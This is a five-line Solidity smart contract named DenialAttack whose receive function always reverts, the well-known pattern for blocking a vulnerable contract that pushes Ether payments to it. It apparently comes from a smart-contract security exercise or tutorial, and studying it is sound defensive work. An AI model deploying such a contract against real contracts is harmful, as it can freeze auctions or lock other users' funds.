contract DenialAttack {
    receive() external payable {
        assert(1 == 2);
    }
}